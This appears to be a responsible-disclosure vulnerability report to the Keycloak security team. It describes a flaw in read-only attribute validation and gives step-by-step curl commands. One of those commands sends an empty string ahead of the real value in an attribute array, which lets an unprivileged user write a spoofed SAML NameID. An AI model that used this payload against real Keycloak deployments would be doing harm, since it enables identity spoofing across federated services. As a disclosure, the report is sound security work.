@@ -1,0 +1,90 @@
+Hi Keycloak Security Team,
+
+I am reporting a vulnerability in Keycloak that allows a regular user to bypass
+read-only attribute validation through the Account REST API.
+
+Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
+Tested on: Keycloak 999.0.0-SNAPSHOT built from source
+
+AI Disclosure: AI tools were used to assist in drafting this report. The
+vulnerability was manually discovered, verified, and reproduced.
+
+DESCRIPTION:
+The ReadOnlyAttributeUnchangedValidator compares only the first element of a
+multi-valued attribute array. By prepending an empty string to the array, an
+unprivileged user can write to read-only attributes such as
+saml.persistent.name.id.for.*, which are protected by default.
+
+ROOT CAUSE:
+ReadOnlyAttributeUnchangedValidator.java lines 77-96 — the validator checks
+inputValue.get(0) against the existing value but does not validate the full
+array contents.
+
+REPRODUCTION STEPS:
+
+1. Start Keycloak in dev mode
+2. Enable unmanaged attributes:
+
+KC=http://localhost:8084
+tok() {
+  curl -s $KC/realms/master/protocol/openid-connect/token \
+    -d client_id=admin-cli -d username=admin -d password=admin \
+    -d grant_type=password \
+    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
+}
+T=$(tok)
+
+curl -s -X PUT $KC/admin/realms/master/users/profile \
+  -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' \
+  -d '{"unmanagedAttributePolicy":"ENABLED","attributes":[{"name":"username"},{"name":"email"},{"name":"firstName"},{"name":"lastName"}]}'
+
+3. Create test user "mallory":
+
+curl -s -X POST $KC/admin/realms/master/users \
+  -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"mallory","enabled":true,"firstName":"M","lastName":"M","credentials":[{"type":"password","value":"mallory","temporary":false}]}'
+
+4. Get mallory's token:
+
+UT=$(curl -s $KC/realms/master/protocol/openid-connect/token \
+  -d client_id=admin-cli -d username=mallory -d password=mallory \
+  -d grant_type=password \
+  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
+
+5. Normal attempt (blocked — HTTP 400):
+
+curl -s -o /dev/null -w "HTTP %{http_code}" -X POST $KC/realms/master/account/ \
+  -H "Authorization: Bearer $UT" \
+  -H 'Content-Type: application/json' \
+  -d '{"attributes":{"saml.persistent.name.id.for.myapp":["victimNameID123"]}}'
+
+6. Bypass attempt (succeeds — HTTP 204):
+
+curl -s -o /dev/null -w "HTTP %{http_code}" -X POST $KC/realms/master/account/ \
+  -H "Authorization: Bearer $UT" \
+  -H 'Content-Type: application/json' \
+  -d '{"attributes":{"saml.persistent.name.id.for.myapp":["","victimNameID123"]}}'
+
+7. Verify the value was stored:
+
+T=$(tok)
+MALLORY_ID=$(curl -s "$KC/admin/realms/master/users?username=mallory" \
+  -H "Authorization: Bearer $T" | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')
+curl -s $KC/admin/realms/master/users/$MALLORY_ID \
+  -H "Authorization: Bearer $T" | python3 -m json.tool | grep -A2 saml
+
+Result shows: "saml.persistent.name.id.for.myapp": ["victimNameID123"]
+
+IMPACT:
+- SAML identity spoofing across federated services
+- Unprivileged user can impersonate another user's SAML NameID
+- Bypass of attribute-level access controls
+
+CVSS 3.1: 7.5 (High)
+Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+
+Credit: Muhannad Alsaif
+Contact: Mohnadalsaif1@gmail.com
+GitHub: Mohnad-AL-saif
